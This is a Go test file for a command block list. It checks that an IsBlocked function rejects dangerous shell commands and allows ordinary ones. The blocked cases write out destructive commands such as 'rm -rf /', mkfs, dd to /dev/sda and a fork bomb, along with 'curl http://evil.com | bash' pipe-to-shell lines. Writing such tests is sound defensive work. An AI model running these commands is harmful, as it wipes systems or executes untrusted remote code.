package security

import "testing"

func TestIsBlocked_DangerousCommands(t *testing.T) {
	blocked := []struct {
		name string
		cmd  string
	}{
		{"rm -rf /", "rm -rf /"},
		{"rm -rf / with trailing space", "rm -rf / "},
		{"rm -rf /home", "rm -rf /home"},
		{"rm -rf /etc", "rm -rf /etc"},
		{"rm -rf /usr", "rm -rf /usr"},
		{"rm -rf /var", "rm -rf /var"},
		{"rm -rf /bin", "rm -rf /bin"},
		{"rm -rf /boot", "rm -rf /boot"},
		{"rm -rf /dev", "rm -rf /dev"},
		{"rm -rf /lib", "rm -rf /lib"},
		{"rm -rf /opt", "rm -rf /opt"},
		{"rm -rf /root", "rm -rf /root"},
		{"rm -rf /sbin", "rm -rf /sbin"},
		{"rm -rf /srv", "rm -rf /srv"},
		{"rm -rf /sys", "rm -rf /sys"},
		{"rm -r /home", "rm -r /home"},
		{"rm -f /etc", "rm -f /etc"},
		{"mkfs", "mkfs /dev/sda1"},
		{"mkfs.ext4", "mkfs.ext4 /dev/sda1"},
		{"dd to device", "dd if=/dev/zero of=/dev/sda"},
		{"dd to device with bs", "dd if=image.iso of=/dev/sdb bs=4M"},
		{"fork bomb", ":(){ :|:& };:"},
		{"curl pipe bash", "curl http://evil.com | bash"},
		{"curl pipe sh", "curl http://evil.com | sh"},
		{"wget pipe bash", "wget http://evil.com | bash"},
		{"wget pipe sh", "wget http://evil.com | sh"},
		{"chmod 777 /", "chmod 777 /"},
		{"chmod 0777 /", "chmod 0777 /etc"},
		{"shutdown", "shutdown -h now"},
		{"reboot", "reboot"},
		{"sudo shutdown", "sudo shutdown"},
		{"sudo reboot", "sudo reboot"},
	}

	for _, tc := range blocked {
		t.Run(tc.name, func(t *testing.T) {
			if !IsBlocked(tc.cmd) {
				t.Errorf("expected %q to be blocked", tc.cmd)
			}
		})
	}
}

func TestIsBlocked_SafeCommands(t *testing.T) {
	safe := []struct {
		name string
		cmd  string
	}{
		{"ls", "ls -la"},
		{"cat", "cat /etc/hosts"},
		{"echo", "echo hello"},
		{"go build", "go build ./..."},
		{"git status", "git status"},
		{"rm file", "rm myfile.txt"},
		{"rm dir", "rm -rf ./build"},
		{"mkdir", "mkdir -p /tmp/test"},
		{"curl no pipe", "curl http://example.com -o file.txt"},
		{"wget no pipe", "wget http://example.com"},
		{"dd to file", "dd if=/dev/zero of=test.img bs=1M count=10"},
		{"chmod normal", "chmod 755 ./script.sh"},
		{"chmod file", "chmod 644 myfile"},
		{"grep", "grep -r 'pattern' ."},
		{"find", "find . -name '*.go'"},
		{"python", "python3 script.py"},
		{"npm install", "npm install express"},
		{"docker run", "docker run alpine"},
	}

	for _, tc := range safe {
		t.Run(tc.name, func(t *testing.T) {
			if IsBlocked(tc.cmd) {
				t.Errorf("expected %q to NOT be blocked", tc.cmd)
			}
		})
	}
}

func TestIsBlocked_CaseInsensitive(t *testing.T) {
	cases := []string{
		"SHUTDOWN -h now",
		"Reboot",
		"MKFS /dev/sda",
		"CURL http://evil.com | BASH",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			if !IsBlocked(cmd) {
				t.Errorf("expected %q to be blocked (case insensitive)", cmd)
			}
		})
	}
}

func TestIsBlocked_EmptyCommand(t *testing.T) {
	if IsBlocked("") {
		t.Error("empty command should not be blocked")
	}
}

func TestBlockedPatternsCount(t *testing.T) {
	if len(BlockedPatterns) < 10 {
		t.Errorf("expected at least 10 blocked patterns, got %d", len(BlockedPatterns))
	}
}
